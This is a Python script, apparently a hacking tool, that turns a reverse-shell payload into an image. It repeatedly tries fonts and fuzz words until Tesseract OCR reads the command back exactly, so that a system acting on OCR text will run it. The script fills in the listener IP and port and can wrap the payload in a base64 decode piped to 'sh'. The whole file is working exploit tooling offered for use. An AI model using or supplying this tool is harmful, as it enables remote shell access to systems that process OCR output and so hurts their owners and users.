#!/usr/bin/env python3
import os
import argparse
import base64
import pytesseract
from PIL import Image, ImageDraw, ImageFont


class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

header = bcolors.BLUE + """
===================================================================================================
████████╗███████╗██╗  ██╗████████╗    ████████╗ ██████╗     ██╗███╗   ███╗ █████╗  ██████╗ ███████╗    
╚══██╔══╝██╔════╝╚██╗██╔╝╚══██╔══╝    ╚══██╔══╝██╔═══██╗    ██║████╗ ████║██╔══██╗██╔════╝ ██╔════╝    
   ██║   █████╗   ╚███╔╝    ██║          ██║   ██║   ██║    ██║██╔████╔██║███████║██║  ███╗█████╗      
   ██║   ██╔══╝   ██╔██╗    ██║          ██║   ██║   ██║    ██║██║╚██╔╝██║██╔══██║██║   ██║██╔══╝      
   ██║   ███████╗██╔╝ ██╗   ██║          ██║   ╚██████╔╝    ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗    
   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝          ╚═╝    ╚═════╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ 
                                                                                          by Trefle
====================================================================================================
""" + bcolors.ENDC

def print_with_colors(Text_str, color):
    print(color + Text_str + bcolors.ENDC)

# Parser init
parser = argparse.ArgumentParser(description=bcolors.GREEN + "A simple python script to generate image from text and get reverse shells (exploiting text recognition for example)" + bcolors.ENDC)

# first argument, required: the IP of the listener
parser.add_argument('-iP','--adress', help=bcolors.GREEN +'IP'+ bcolors.ENDC+' adress of the listener')

# name of the image file to be supplied for modification
parser.add_argument('-o','--output', help=bcolors.GREEN +'Name'+bcolors.ENDC+' of the image file to create', required=True)

# name of the image file to be supplied for modification
parser.add_argument('-b64','--base64', help='encode the payload using base 64', action="store_true")

# Port argument, I usually use 4444 so this is why this is the default
parser.add_argument('-p','--port', help=bcolors.GREEN +'Port'+bcolors.ENDC+' that you wish to use for the listener (default: 4444)')

# text file to be converted
parser.add_argument('-pf','--payload', help=bcolors.GREEN +'text file'+bcolors.ENDC+'to convert, use '+bcolors.WARNING +'^IP^'+bcolors.ENDC+' and '+bcolors.WARNING +'^PORT^'+bcolors.ENDC+' to define the IP and Port positions', required=True)

# font choice
parser.add_argument("-fo", "--font", help=bcolors.GREEN +'Font'+bcolors.ENDC+" to be used for the text in the image (default: Courier)")

# I got tired of trying again and again so I wrote a script to automate the trial and error process
parser.add_argument("-fl", "--fontlist", help=bcolors.GREEN +'Font list file'+bcolors.ENDC+", the fonts will be tried one by one until the string is correctly understood by tesseract (default: Courier)" )

parser.add_argument("-fu", "--fuzz", help="File containing list of fuzz words to replace '^FUZZ^' in the payload string")

def Parse_args():
    """a simple argument parser that replaces the default values if needed
    
    Returns
    -------
        IP (str): ip adress of the listener in string format
        Port (str): port to use for the reverse shell connection
        OutputFileName (str): name of the payload image
        payload_file (str): name of the text file to convert to an image
        font_choice (str): name of the font to use
        b64_bool (bool): True if you want to encode the payload False elsewhat
        isfontalist (bool): True if you want to find a font that gives the right interpretation
                            within py tesseract
        fuzzlist (str, list): list of "words" to fuzz in the payload (keyword: ^FUZZ^)


    """
    # default values
    IP = "127.0.0.1"
    Port = "4444"
    isfontaList = False
    font_choice = "arial"
    b64_bool = False
    fuzzlist = ['']


    # let's get all the arguments
    args = vars(parser.parse_args())

    # Mandatody arguments
    OutputFileName = args["output"]
    payload_file = args["payload"]

    # Optional arguments
    if args["port"]:
        Port = args["port"]

    if args["adress"]:
        IP = args["adress"]

    if args["base64"]:
        b64_bool = True

    if args["fontlist"]:
        isfontaList = True
        font_choice = args["fontlist"]

    elif args["font"]:
        font_choice = args["font"]

    if args["fuzz"]:
        fuzzlist = open(args["fuzz"]).readlines()

    return IP, Port, OutputFileName, payload_file, font_choice, b64_bool, isfontaList, fuzzlist

def Generate_image(payload, font, character_wideness_pix=30, height=75, Fontsize=40, strokeWidth=1):
    """Generates the image in pillow format (no disk I/O to gain time)

    this function generates the image in pillow format, the kwargs were determined via a 
    trial and error process and it seems to work fine enough, feel free to change them at will

    Args:
        payload (str): string containing the payload
        font (str): string containing the font name
        character_wideness_pix (int, optional): this will be multiplied to the number of characters
                                                to determine image width. Defaults to 30.
        height (int, optional): height of the generated image. Defaults to 75.
        Fontsize (int, optional): size of the font to use. Defaults to 40.
        strokeWidth (int, optional): width of the character font. Defaults to 2.

    Returns:
        pillow image: image in pillow format to be saved late if a match is found
    """
    img = Image.new('RGB', (len(payload) * character_wideness_pix, height), color = 'white')
    draw = ImageDraw.Draw(img)

    # A series of try / except to determine the right extension for the font file
    # it's nested and kinda ugly but I guess it works
    try:
        font = ImageFont.truetype("{}.ttf".format(font), Fontsize)
    except:
        try:
            font = ImageFont.truetype("{}.t1".format(font), Fontsize)
        except:
            try:
                font = ImageFont.truetype("{}.otf".format(font), Fontsize)
            except:
                return 0

    # if we got to this line it means that we were able to find the font
    draw.text((0, 3),payload,(0,0,0),font=font, stroke_width=strokeWidth)

    return img

if __name__ =="__main__":
    print(header)
    IP, Port, OutputFileName, payload_file, font, b64_bool, isfontaList, fuzzlist = Parse_args()

    print_with_colors("Current configuration\n=====================================", bcolors.GREEN)
    print(bcolors.GREEN + "[+] listener ip: {}".format(bcolors.WARNING+IP+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] listener port: {}".format(bcolors.WARNING+Port+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] Output file: {}".format(bcolors.WARNING+OutputFileName+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] Payload text file: {}".format(bcolors.WARNING+payload_file+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] font: {}".format(bcolors.WARNING+font+bcolors.ENDC) +bcolors.ENDC)
    print_with_colors("=====================================\n", bcolors.GREEN)

    with open(payload_file) as PLF:
        # Read the payload file
        payload = PLF.read()

        # Replace the keywords, if any
        payload = payload.replace("^IP^","{}".format(IP)).replace("^PORT^","{}".format(Port))

        # User feedback
        print_with_colors("---> payload: \n{}".format(bcolors.WARNING + payload + bcolors.ENDC), bcolors.CYAN)
        
        if b64_bool:
            # Base 64 encoding if required
            payload = "base64 -d <<< ".encode() + base64.b64encode(payload.encode()) + "| sh".encode()
            print_with_colors("\n---> encoded payload: ", bcolors.CYAN)
            print(bcolors.WARNING + payload.decode() + bcolors.ENDC)

    if isfontaList:
        with open(font) as FF:
            i = 0.0 # this variable is only here to display the percentage
            lines = FF.readlines()
            for line in lines:
                font = line.strip() # removes the "\n and potential spaces"
                for fuzz in fuzzlist:
                    fuzzed_payload = payload.replace("^FUZZ^", fuzz).replace("\n","")
                    img = Generate_image(fuzzed_payload, font)
                    if not isinstance(img, int):
                        interpreted_payload = pytesseract.image_to_string(img)
                        interpreted_payload = interpreted_payload.strip().replace("\n","")
                        try:
                            # I need the try and except here because sometimes, the interpreted payload is longer than the payload
                            list = [bcolors.BLUE + interpreted_payload[i] +bcolors.ENDC if interpreted_payload[i]==fuzzed_payload[i] else bcolors.FAIL + "X" + bcolors.ENDC for i in range(len(interpreted_payload))]
                            print("[+] calibration: {:.2f}%, {}                                                                             ".strip().format(100*i/(len(lines)*len(fuzzlist)),''.join(list)), end='\r')
                        except:
                            pass
                        if interpreted_payload == fuzzed_payload:
                            print("[+] calibration: {:.2f}%, {}                                                              ".strip().format(100*i/len(lines),''.join(list)))
                            print("Found a match with font: {}".format(line))
                            img.save(OutputFileName,format='JPEG')
                            quit()
                    i+=1

    else:
        img = Generate_image(payload, font)
        img.save(OutputFileName, format='JPEG')
